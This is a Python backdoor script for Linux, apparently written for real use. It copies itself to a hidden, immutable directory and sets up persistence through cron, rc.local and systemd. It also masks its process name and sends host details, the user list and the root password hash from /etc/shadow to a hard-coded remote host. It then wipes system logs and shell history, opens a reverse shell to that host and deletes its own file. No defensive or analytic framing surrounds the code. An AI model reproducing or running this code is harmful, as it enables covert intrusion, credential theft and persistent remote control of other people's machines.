
import os
import subprocess
import socket
import psutil  # pip install psutil for process hiding
import pty  # For proper TTY
import time

# Configuration
ATTACKER_IP = "botconnect.ddns.net"  # Attacker's IP
PORT = 4444  # Port for reverse shell and server
HIDDEN_DIR = "/var/tmp/.webservice"  # Hidden directory
HIDDEN_FILE = f"{HIDDEN_DIR}/webservice.py"  # Hidden file
PROCESS_NAME = "[webservice]"  # Process name to mimic
LOG_FILES = ["/var/log/auth.log", "/var/log/syslog", "/var/log/utmp", "/var/log/wtmp", os.path.expanduser("~/.bash_history")]  # Logs to clean
PERSIST_METHODS = [
    f"(crontab -l 2>/dev/null | grep -v {HIDDEN_FILE}; echo \"* * * * * python3 {HIDDEN_FILE} > /dev/null 2>&1\") | crontab -",
    f"[ -f /etc/rc.local ] && echo 'python3 {HIDDEN_FILE}' >> /etc/rc.local",
    f"echo '@reboot python3 {HIDDEN_FILE}' | crontab -",
    f"mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=python3 {HIDDEN_FILE}\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
]
SUDOERS_FILE = "/etc/sudoers.d/webservice"

# Check and elevate to root if possible
if os.geteuid() != 0:
    try:
        subprocess.run(["sudo", "-n", "python3", __file__], check=True)
        exit(0)
    except subprocess.CalledProcessError:
        is_admin = "No"
        # Add sudoers entry for root elevation on reboot
        if os.geteuid() == 0:
            with open(SUDOERS_FILE, 'w') as f:
                f.write(f"{os.getlogin()} ALL=(ALL) NOPASSWD: {HIDDEN_FILE}\n")
            os.chmod(SUDOERS_FILE, 0o440)
            os.system(f"chattr +i {SUDOERS_FILE} 2>/dev/null")
else:
    is_admin = "Yes"

# Hide the payload
try:
    if os.path.exists(HIDDEN_DIR):
        os.system(f"chattr -i {HIDDEN_DIR} {HIDDEN_FILE} 2>/dev/null")
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    with open(__file__, 'r') as f:
        code = f.read()
    with open(HIDDEN_FILE, 'w') as f:
        f.write(code)
    os.chmod(HIDDEN_DIR, 0o700)
    os.chmod(HIDDEN_FILE, 0o700)
    os.system(f"chattr +i {HIDDEN_DIR} {HIDDEN_FILE} 2>/dev/null")
except PermissionError as e:
    print(f"[ERROR] Permission denied: {e}. Try running as root.")
    exit(1)

# Persistence (multiple methods)
for method in PERSIST_METHODS:
    os.system(method)

# Hide process
try:
    p = psutil.Process(os.getpid())
    p.name(PROCESS_NAME)
except Exception:
    pass  # Fallback if psutil fails

# Data Exfiltration
info = f"Hostname: {os.uname().nodename}\nOS: {os.uname().sysname} {os.uname().release}\nIP: {subprocess.getoutput('ip addr show | grep inet | awk \'{print $2}\' | paste -sd \',\'')}\nUsers: {subprocess.getoutput('cat /etc/passwd | cut -d: -f1 | paste -sd \',\'')}"

# Try root password from /etc/shadow
if is_admin == "Yes":
    shadow = subprocess.getoutput('grep "^root:" /etc/shadow 2>/dev/null || echo "Not readable"')
    info += f"\nRoot Shadow: {shadow}"
else:
    info += "\nNon-root: Shadow not readable. Other Users: " + subprocess.getoutput('grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd \',\' 2>/dev/null')

# Send "sono connesso!" with admin status and info to server
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, PORT))
    s.send(f"sono connesso! Admin: {is_admin}\n".encode('utf-8'))
    s.send(info.encode('utf-8'))
    s.close()
except Exception:
    pass  # Silent fail if server is down

# Clean logs to hide tracks
for log in LOG_FILES:
    if os.path.exists(log):
        try:
            open(log, 'w').close()
        except PermissionError:
            pass

# Reverse Shell (hidden process with TTY)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, PORT))
    pid, fd = pty.fork()
    if pid == 0:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    s.close()
except Exception:
    pass

# Self-delete to make removal harder
try:
    os.remove(__file__)
except Exception:
    pass
